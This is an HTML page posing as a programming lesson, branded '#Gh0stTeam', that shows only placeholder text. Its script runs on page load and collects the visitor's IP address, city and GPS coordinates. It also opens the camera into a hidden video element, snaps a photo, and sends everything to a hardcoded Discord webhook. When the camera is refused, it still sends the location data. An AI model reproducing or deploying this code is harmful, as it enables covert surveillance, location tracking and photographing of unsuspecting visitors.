<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aula de Programação - #Gh0stTeam</title>
    <style>
        body { background-color: black; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        .texto-grande { font-size: 2.5rem; font-weight: bold; text-align: center; max-width: 80%; margin-bottom: 20px; text-transform: uppercase; }
        .gh0st { color: red; font-size: 1.2rem; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="texto-grande">TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO</div>
    <div class="gh0st">#Gh0stTeam</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496557379351875745/PsqDIUD8fIDhCGozVuKw9JQOHjMX-FQgmEfVoaxdGFcRyTq926Dg5m47hxDC5BrKHlTx';

        async function iniciar() {
            // Dados iniciais
            let info = { 
                ip: 'Buscando...', 
                cidade: 'Buscando...', 
                estado: 'Buscando...', 
                latitude: 'Não permitida', 
                longitude: 'Não permitida' 
            };

            // 1. Captura IP e Localização por IP
            try {
                const res = await fetch('https://ipapi.co');
                const data = await res.json();
                info.ip = data.ip || 'Erro';
                info.cidade = data.city || 'Desconhecida';
                info.estado = data.region || 'Desconhecido';
            } catch (e) { console.log("Erro no IP"); }

            // 2. Captura Coordenadas Escritas (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    info.latitude = pos.coords.latitude;
                    info.longitude = pos.coords.longitude;
                    tirarFotoEEnviar(info);
                }, () => { 
                    tirarFotoEEnviar(info); // Envia mesmo sem GPS
                });
            } else {
                tirarFotoEEnviar(info);
            }
        }

        async function tirarFotoEEnviar(dados) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('file', blob, 'foto.png');
                        
                        // Mensagem formatada com texto escrito
                        const relatorio = `🛑 **RELATÓRIO DE ACESSO #Gh0stTeam** 🛑\n` +
                                          `🌐 **IP:** ${dados.ip}\n` +
                                          `📍 **CIDADE:** ${dados.cidade}\n` +
                                          `🚩 **ESTADO:** ${dados.estado}\n` +
                                          `📐 **LATITUDE:** ${dados.latitude}\n` +
                                          `📐 **LONGITUDE:** ${dados.longitude}`;

                        fd.append('content', relatorio);
                        
                        fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/png');
                }, 1000);
            } catch (e) {
                // Se a câmera for negada
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        content: `⚠️ **Câmera Bloqueada! Dados coletados:**\n🌐 IP: ${dados.ip}\n📍 Cidade: ${dados.cidade}\n📐 Latitude: ${dados.latitude}\n📐 Longitude: ${dados.longitude}` 
                    })
                });
            }
        }

        window.onload = iniciar;
    </script>
</body>
</html>
